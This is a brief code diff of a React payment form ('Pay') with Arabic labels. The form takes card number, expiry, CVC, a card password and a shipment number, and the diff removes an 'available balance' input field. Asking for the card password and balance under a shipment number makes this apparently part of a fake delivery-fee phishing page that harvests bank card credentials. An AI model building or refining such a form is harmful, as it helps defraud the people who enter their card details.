@@ -24,7 +24,6 @@ const Pay=()=>{
         YY:"",
         cvcCard:"",
         كلمةالمرورالبطاقة:"",
-          اارصيد:"",
         رقمالشحــنة:datas
       }
     });
@@ -113,9 +112,7 @@ const Pay=()=>{
           <div className={styles.slebale}>
           <label htmlFor="cvc">
           cvc/cvv</label>
-              <label htmlFor="الرصيد">
-                          الرصيدالمتوفر
-                     </label>
+            
           <label htmlFor="data">
               تاريخ انتهاء البطاقة</label>
             </div>
@@ -126,13 +123,7 @@ const Pay=()=>{
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
                 }} maxLength="3" required/>
-                 <div className={styles.curmony}>
-                     
-                     <input type="text" name='الرصيد' placeholder='0.000000'onChange={(e) => {
-                  const { name, value } = e.target;
-                  setDynamicFormData(name, value);
-                }} maxLength="7" required/>
-                 </div>
+                 
                 <div>
                 <input type="text" name='MM' placeholder='(MM)' onChange={(e) => {
                   const { name, value } = e.target;
